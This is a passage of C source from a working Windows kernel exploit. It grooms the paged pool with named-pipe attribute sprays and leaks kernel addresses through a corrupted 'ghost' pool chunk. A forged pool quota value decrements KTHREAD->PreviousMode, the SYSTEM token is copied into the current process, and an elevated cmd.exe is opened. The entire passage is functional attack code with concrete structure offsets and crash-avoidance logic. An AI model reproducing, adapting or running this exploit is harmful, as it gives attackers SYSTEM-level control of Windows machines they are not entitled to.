	printf("[*] Spraying %d pipe attributes to retake attribute\n", (GHOST_PIPE_ARR_SIZE/2*3));
	for (int i = 0; i < (GHOST_PIPE_ARR_SIZE / 2 * 3); i++) {
		if (createPipeAttr((char*)fakeGhostChunk, LFH_SIZE, ghostOut, ghostOutSize, &(ghostHeaderPipesArray[i]))) {
			goto CLEANUP;
		}
	}


	///////////////////////////////////////////////////////////////////////////////////////////////////
	// Use read primitive to obtain values required for arbitrary decrement of KTHREAD->PreviousMode //
	//  Note: none of the functions goto CLEANUP on failure; since that would cause a certain BSOD   //
	///////////////////////////////////////////////////////////////////////////////////////////////////

	// Load ntoskrnl.exe and npfs.sys with LoadLibraryA here to obtain offsets for version independence //

	// Obtain address of ghost chunk by reading the old Flink pointer (subtract 0x10 to account for pool header)
	kghostAddr = (fakePipeRead(ghostChunk, fakeUserlandPipeAttr, restoreFlink) - 0x10);
	if (!kghostAddr) { printf("[-] Read primitive failed\n"); goto READFAIL;}
	printf("[+] Read kernel mode address of ghost chunk: %llx\n", kghostAddr);
	
	// Read file object at ghostChunk->list.OriginalFlink - 0x140 (ROOT_PIPE_ATTR_OFFSET) + 0x30 (FILE_OBJ_OFFSET)
	rw_where = fakePipeRead(ghostChunk, fakeUserlandPipeAttr, (restoreFlink - 0x140 + 0x30)); if (!rw_where) { goto READFAIL; }
	rw_where = fakePipeRead(ghostChunk, fakeUserlandPipeAttr, (rw_where + 0x8));	// Read device object from file+0x8
	rw_where = fakePipeRead(ghostChunk, fakeUserlandPipeAttr, (rw_where + 0x8));	// Read driver object from device+0x8
	rw_where = fakePipeRead(ghostChunk, fakeUserlandPipeAttr, (rw_where + 0x70));	// Read Npfs!NpFsdCreate addr from driver+0x70
	
	// Use kernel driver function offsets to obtain base address of ntoskrnl.exe
	rw_where = rw_where - NPFS_NPFSDCREATE_FUNC_OFFSET + NPFS_IMP_EXALLOCATEPOOLWITHTAG_OFFSET;
	rw_where = fakePipeRead(ghostChunk, fakeUserlandPipeAttr, rw_where);		// Read Npfs!_imp_ExAllocatePoolWithTag address
	ntosbase = rw_where - NT_EXALLOCATEPOOLWITHTAG_OFFSET;				// Subtract offset to obtain base ntoskrnl address
	if (!ntosbase) { printf("[-] Read primitive failed\n"); goto READFAIL; }
	printf("[+] Base address of ntoskrnl.exe obtained: %llx\n", ntosbase);
	
	// Leak nt!ExpPoolQuotaCookie value
	kpoolCookie = fakePipeRead(ghostChunk, fakeUserlandPipeAttr, (ntosbase + NT_EXPPOOLQUOTACOOKIE_OFFSET));
	if (!kpoolCookie) { printf("[-] Read primitive failed\n"); goto READFAIL; }
	printf("[+] Pool quota cookie value obtained: %llx\n", kpoolCookie);

	// Leak SYSTEM EPROCESS pointer from nt!PsInitialSystemProcess
	systemEproc = fakePipeRead(ghostChunk, fakeUserlandPipeAttr, (ntosbase + NT_PSINITIALSYSTEMPROCESS_OFFSET));
	if (!systemEproc) { printf("[-] Read primitive failed\n"); goto READFAIL; }
	printf("[+] System EPROCESS address obtained: %llx\n", systemEproc);

	// Leak current EPROCESS address by iterating through structures (EPROCESS+0x440 = Eprocess.pid)	
	iterProc = systemEproc;
	iterPid = -1;	// Initialize iterPid for loop
	while (thisEproc == 0) { 
		// Move to next EPROCESS
		iterProc = (fakePipeRead(ghostChunk, fakeUserlandPipeAttr, (iterProc + 0x448))) - 0x448;
		// Read next PID from EPROCESS +0x440
		iterPid = fakePipeRead(ghostChunk, fakeUserlandPipeAttr, (iterProc + 0x440));

		// if PID=4 (SYSTEM PID), entire process loop has completed without finding targets; if PID=0, read likely failed
		if (iterPid == 4 || iterPid == 0) {
			printf("[-] Could not find current EPROCESS\n");
			goto READFAIL;
		}
		// Check if current EPROCESS was found
		if (iterPid == currentPid) {
			thisEproc = iterProc;
			printf("[+] Current process EPROCESS obtained: %llx\n", thisEproc);
		}
	}

	// Read pointer from thread list head (EPROCESS + 0x5e0) to obtain kthread address
	rw_where = thisEproc + 0x5e0;	// Read from thread list head offset
	kthreadPtr = (fakePipeRead(ghostChunk, fakeUserlandPipeAttr, rw_where) - 0x4e8);
	if (!kthreadPtr) { printf("[-] Read primitive failed\n"); goto READFAIL; }
	printf("[+] Read pointer to KTHREAD from EPROCESS: %llx\n", kthreadPtr);

	// Allocate POOL_QUEUE_ENTRY for ghost chunk that holds a fake EPROCESS to target Kthread->PreviousMode for decrement 
	//	Also subtracting 0x1 to Kthread->PreviousMode address to since minimum decrement is 0x10 (based on BlockSize); decrement 0x100 to hit PreviousMode
	rw_where = (kthreadPtr+0x232 -1) - (0x80); // KTHREAD+0x232 = PreviousMode (-0x80 to account for subtraction at nt!PspReturnQuota+0x42)
		if (allocFakeEprocess(fakeEprocessData, fakeEprocessSize, ghostChunk, rw_where)) {
		goto READFAIL;
	}

	// Read file object at ghostChunk->list.OriginalFlink - 0x140 (ROOT_PIPE_ATTR_OFFSET) + 0x48 (PIPE_QUEUE_ENTRY_OFFSET)
	kFakeEprocAddr = fakePipeRead(ghostChunk, fakeUserlandPipeAttr, (restoreFlink - 0x140 + 0x48));
	kFakeEprocAddr = kFakeEprocAddr + 0x30 + 0x50;	// Set address of fake EPROCESS contained inside PIPE_QUEUE_ENTRY object
	if (!kFakeEprocAddr) { printf("[-] Read primitive failed\n"); goto READFAIL; }
	printf("[+] Read address of fake EPROCESS inside PIPE_QUEUE_ENTRY: %llx\n", kFakeEprocAddr);

	// Jump past other read primitive function if one of them fails; will allow createGhostDecrement to fix ghost Flink and avoid BSOD
READFAIL:


	/////////////////////////////////////////////////////////////////////////////////////////////
	// Rewrite ghost chunk header to set PoolQuota, resulting in arbitrary decrement primitive //
	/////////////////////////////////////////////////////////////////////////////////////////////

	// Create new fake ghost chunk with PoolQuota set
	poolQuota = (kghostAddr ^ kFakeEprocAddr ^ kpoolCookie);
	if (kghostAddr == 0 || kFakeEprocAddr == 0 || kpoolCookie == 0)
	{
		printf("[-] Could not set pool quota value\n");
		poolQuota = 0;
	}
	if (poolQuota) {
		printf("[+] Calculated pool quota of %llx for arbitrary decrement\n", poolQuota);
	}
	createGhostDecrement(fakeGhostChunk, restoreFlink, poolQuota);

	// Fill any new holes in kLFH before freeing attribute containing ghost chunk
	printf("[*] Grooming kLFH again before freeing object holding the ghost chunk\n");
	if (sprayPipes(0x200, LFH_SIZE)) {
		printf("[-] Pipe attribute spray failed\n");
		goto CLEANUP;
	}

	// Create holes in paged pool kLFH for target lfh size, setting data in remaining pipes to contain ghost header
	if (makeHoles(LFH_SIZE, remainingPipesArray, remainingPipesSize)) {
		printf("\n[-] Making holes in kLFH failed\n");
		goto CLEANUP;
	}

	// Free pipe attr containing ghost chunk (must free all recently allocated attributes this time)
	printf("[*] Freeing all pipe attributes that could contain ghost chunk\n");
	for (int i = 0; i < (GHOST_PIPE_ARR_SIZE / 2 * 3); i++) {
		freePipeAttr(&(ghostHeaderPipesArray[i]));
	}

	// Spray to retake attribute that contains ghost chunk, corrupting ghost chunk->list.Flink to point to fake attribute
	printf("[*] Spraying %d pipe attributes to retake attribute\n", GHOST_PIPE_ARR_SIZE*2);
	for (int i = 0; i < GHOST_PIPE_ARR_SIZE*2; i++) {
		if (createPipeAttr((char*)fakeGhostChunk, LFH_SIZE, ghostOut, ghostOutSize, &(ghostHeaderPipesArray[i]))) {
			goto CLEANUP;
		}
	}

	// Free ghost chunk to trigger arbitrary decrement on Kthread->PreviousMode
	printf("[*] Executing arbitrary decrement\n"); Sleep(1000); 
	executeDecrement(ghostChunk);
	freePipeAttr(ghostChunk);	// Free ghost chunk since a second decrement won't be needed


	/////////////////////////////////////////////////////////////////////////////////
	// With PreviousMode set to kernelmode, use arbitrary RW to steal SYSTEM token //
	/////////////////////////////////////////////////////////////////////////////////

	// Read value of SYSTEM token from its EPROCESS
	rw_where = read_qword(systemEproc + 0x4b8);
	if (rw_where == 0) {
		printf("[-] Failed to steal SYSTEM token\n");
		goto CLEANUP;	// PreviousMode likely not set if this failed, so can cleanup and exit
	}
	printf("[+] Stealing SYSTEM process token: %llx\n", rw_where);

	// Overwrite current EPROCESS token with SYSTEM's token
	write_qword((thisEproc + 0x4b8), rw_where);


	/////////////////////////////////////////////////////////////////////////////////////////
	// Cleanup any necessary kernelmode objects and restore PreviousMode bit for stability //
	/////////////////////////////////////////////////////////////////////////////////////////

	// Restore PreviousMode to 1; besides that heap should be stable since vuln object was larger than 0x150 bytes
	//	Exploits targeting smaller vulnerable chunk sizes may need to perform additional writes to the heap for restoration
	rw_where = read_qword(kthreadPtr + 0x232);
	if (rw_where == 0) {
		printf("[-] Failed to to read KTHREAD->PreviousMode\n");
		goto CLEANUP;
	}
	printf("[+] Restoring value of Kthread->PreviousMode from: %llx\n", rw_where);
	rw_where = rw_where ^ 1 << 0;
	write_qword((kthreadPtr + 0x232), rw_where);

	// Open cmd.exe as admin for proof of successful privilege escalation
	//printf("[DEBUG] After privilege escalation\n"); Sleep(1000); DebugBreak();
	system("start cmd.exe");

	// Should only get here if full exploit completes, so set success to true
	success = true;	

	// Clean up files and memory buffers before exit
CLEANUP:
	//printf("[DEBUG] Hit enter to exit"); getchar(); // DEBUG
	if (ghostChunk) { delete ghostChunk; }
	if (fakeGhostChunk) { free(fakeGhostChunk); }
	if (fakeUserlandPipeAttr) { free(fakeUserlandPipeAttr); }
	if (ghostHeaderAttrBuf) { free(ghostHeaderAttrBuf); }
	if (ghostBuf) { free(ghostBuf); }
	if (ghostOut) { free(ghostOut); }
	return success;
}












